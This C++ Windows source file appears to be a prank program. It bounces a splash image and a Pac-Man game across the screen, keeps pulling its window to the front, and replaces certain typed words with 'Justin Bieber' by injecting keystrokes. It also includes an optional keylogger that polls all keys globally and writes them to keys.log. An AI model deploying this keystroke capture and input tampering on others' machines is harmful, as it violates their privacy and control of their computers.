// EvilBullshitWindowless.cpp : Defines the entry point for the application.
//

// todo: random set of replacement words

#include "stdafx.h"
#include "EvilBullshitWindowless.h"
#include <Windows.h>
#include <wincodec.h>
#include <ctime>
#include <fstream>
#include <atlstr.h>
#include <vector>
#include <string>
#include "resource.h"

using std::string;
using std::vector;

// things for moving the splash screen
HWND splashWindow;
HDC g_hdcScreen;
HDC g_hdcMem;
POINT ptZero = { 0 };
SIZE g_sizeSplash;
BLENDFUNCTION g_blend;
POINT ptOrigin;
HWND g_splashWindow;
HWND g_evilWindow;
HBITMAP g_slashMap;
vector<HBITMAP> logoAnimation;
int maxx;
int maxy;
bool left, right, up, down;

// Global Variables:
#define MAX_LOADSTRING 100
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name
int _nCmdShow;

#include "splashIamge.h"

#define SHIFT   1
#define CONTROL 2
#define ALT 4
#define CLICK 8

// replacement word
string replacement = "Justin Bieber";
// list of key phrases
vector<string> KeyWords = { "charlie", "mel", "guys", "wondering" };
// do we want to also be a keylogger?
bool logKeys = false;

#include "stringFunctions.h"

int rotclamp(int val, int min, int max) {
	if (val < min) return max;
	if (val > max) return min;
	return val;
}

#include "GameEntity.h"
GameEntity pacMan = GameEntity(0, 0, 48, 48, vector<HBITMAP>(), g_splashWindow);

// enter loop of sillyness
void loopforever() {
	// set up objects
	unsigned int state = 0;
	unsigned int oldState = 0;
	auto recentKeys = std::vector<char>();
	std::ofstream outfile;
	outfile.open("keys.log", std::ios_base::app);
	outfile << "\nData:\n";	
	size_t patternLength = 0;
	for (auto&& pattern : KeyWords) {
		if (pattern.length() > patternLength)
			patternLength = pattern.length();
	}

	//// get the primary monitor's info
	HMONITOR hmonPrimary = MonitorFromPoint(ptZero, MONITOR_DEFAULTTOPRIMARY);
	MONITORINFO monitorinfo = { 0 };
	monitorinfo.cbSize = sizeof(monitorinfo);
	GetMonitorInfo(hmonPrimary, &monitorinfo);

	//// center the splash screen in the middle of the primary work area
	RECT & rcWork = monitorinfo.rcWork;
	maxx = rcWork.right - rcWork.left;
	maxy = rcWork.bottom - rcWork.top;
	int xxx = 0;
	int yyy = 0;
	int yd = 1;
	int xd = 1;
	int i = 0;
	int gamestate = 0;
	left = right = up = down = false;

	pacMan.LoadSpritemap({ IDB_Pac_l_c,IDB_Pac_l_o,IDB_Pac_r_c,IDB_Pac_r_o,IDB_Pac_u_c,IDB_Pac_u_o,IDB_Pac_d_c,IDB_Pac_d_o });

	// enter loop state
	while (1) {
		// do bounce animation
		{
			SwitchToThisWindow(g_splashWindow, true);

			if (xxx > maxx - g_sizeSplash.cx || xxx < 0) {
				xd *= -1;
			}
			xxx += xd;
			if (yyy > maxy - g_sizeSplash.cy || yyy < 0) {
				yd *= -1;
			}
			yyy += yd;
			i++;
			if (i < 0 || i >= 4000) {
				i = 0;
				if (gamestate == 0) {
					gamestate = 1;
					pacMan.x = xxx;
					pacMan.y = yyy;
					pacMan.window = g_splashWindow;
				}
			}
		}
		if (gamestate == 0) {
			SetSplashImage(g_splashWindow, logoAnimation[(i % 40)/10], xxx, yyy);
		} else
		if (gamestate == 1) {
			SetSplashImage(g_evilWindow, logoAnimation[(i % 40) / 10], xxx, yyy);
			i++;
			if (i < 0 || i >= 200) {
				i = 0;
			}
			// only use the most recent direction
			bool test;
			if (test = GetAsyncKeyState(VK_LEFT)) {
				if (!left)
					pacMan.direction = 0;
			}
			left = test;
			if (test = GetAsyncKeyState(VK_RIGHT)) {
				if (!right)
					pacMan.direction = 1;
			}
			right = test;
			if (test = GetAsyncKeyState(VK_UP)) {
				if (!up)
					pacMan.direction = 2;
			} 
			up = test;
			if (test = GetAsyncKeyState(VK_DOWN)) {
				if (!down)
					pacMan.direction = 3;
			}
			down = test;

			pacMan.update();
			pacMan.draw();
		}

		// this is the text replacer
		// watch special key state changes
		oldState = state;
		state = 0;
		if (GetAsyncKeyState(1)) {
			state |= CLICK;
			if (logKeys && state != oldState)
				outfile << "`CLICK`";
		}
		if (GetAsyncKeyState(16)) {			
			state |= SHIFT;
		}
		if (GetAsyncKeyState(17)) {
			state |= CONTROL;
			if (logKeys && state != oldState)
				outfile << "`CTRL-`";
		}
		if (GetAsyncKeyState(18)) {
			state |= ALT;
			if (logKeys && state != oldState)
				outfile << "`ALT-`";
		}
		// check range of virtual keys
		for (int i = 0; i < 256; i++) {
			// key with id of i has been pressed, cast to unsigned char for boolean test
			if ((unsigned char)GetAsyncKeyState(i)) {
				 // transform to ascii value
				auto ch = VKtoASCII(i, (state & SHIFT));
				// throw out garbage
				if (ch > 0) {
					// remember recent keys
					recentKeys.push_back(lowercase(ch));
					// forget old keys
					if (recentKeys.size() > patternLength) {
						recentKeys.erase(recentKeys.begin());
					}
					// keylog if set
					if (logKeys) {
						outfile << ch;
						outfile.flush();
					}
					// if a key phrase has been typed count it's length
					// then backspace it away and type out a replacement
					auto replaceChars = typedKeyPhrase(recentKeys);
					if (replaceChars) {
						for (int i = replaceChars; i--;) {
							triggerKey(VK_BACK);
						}
						typeString(replacement);
					}					
				}
			}
		}
		Sleep(1);
	}
}

#include "windowsCrap.h"